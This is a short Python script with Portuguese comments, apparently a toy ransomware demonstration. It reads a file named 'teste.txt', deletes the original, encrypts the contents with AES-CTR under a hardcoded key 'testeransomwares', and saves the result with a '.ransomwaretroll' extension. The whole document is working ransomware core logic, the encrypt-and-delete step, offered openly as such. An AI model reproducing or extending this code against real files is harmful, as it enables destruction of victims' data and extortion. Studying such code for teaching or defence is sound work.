import pyaes

import os

## abrir o arquivo que será criptografado
nome_arquivo = "teste.txt"
arquivo = open(nome_arquivo, "rb")
data_arquivo = arquivo.read()
arquivo.close()

## remover o arquivo
os.remove(nome_arquivo)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(data_arquivo)

## salvar o arquivo criptografado
novo_arquivo = nome_arquivo + ".ransomwaretroll"
novo_arquivo = open(f'{novo_arquivo}','wb')
novo_arquivo.write(crypto_data)
novo_arquivo.close()
